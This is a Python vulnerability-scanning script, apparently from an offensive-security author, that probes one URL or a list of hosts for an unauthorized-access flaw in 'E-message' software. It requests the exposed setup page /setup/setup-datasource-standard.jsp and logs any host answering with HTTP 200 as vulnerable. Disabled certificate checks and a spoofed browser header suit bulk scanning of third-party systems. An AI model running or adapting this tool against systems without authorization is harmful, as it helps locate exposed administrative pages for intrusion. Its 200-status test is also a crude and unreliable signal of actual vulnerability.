#!/usr/bin/env python
# -*- conding:utf-8 -*-

import requests
import argparse
import json
import urllib3
import sys
urllib3.disable_warnings()

def title():
    print("""
                               E-message 越权访问漏洞
                      use: python3  E-message_越权访问漏洞.py
                                 Author: kento-sec
    """)

class information(object):
    def __init__(self, args):
        self.args = args
        self.url = args.url
        self.file = args.file
        result = "target.txt"

    def target_url(self):
        result = "vuln_result.txt"
        vuln_url = self.url + "/setup/setup-datasource-standard.jsp"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows; U; Win98; fr-FR; rv:1.7.6) Gecko/20050226",
        }

        try:
            res = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
            if res.status_code == 200:
                print(f"\033[31m[!]  目标系统: {self.url} 存在E-message_越权访问漏洞！\033[0m")
                with open(result, mode="a") as response:
                    response.write(self.url + "\n")
            else:
                print(f"[!]  目标系统: {self.url} 不存在E-message_越权访问漏洞！")
        except Exception as e:
            print(f"[-]  站点连接错误！")

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip() # 去除两边空格
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)

if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description="E-message 越权访问漏洞")
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"target.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print("[-]  参数错误！\neg1:>>>python3 E-message_越权访问漏洞.py -u http://127.0.0.1\neg2:>>>python3 E-message_越权访问漏洞.py -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()

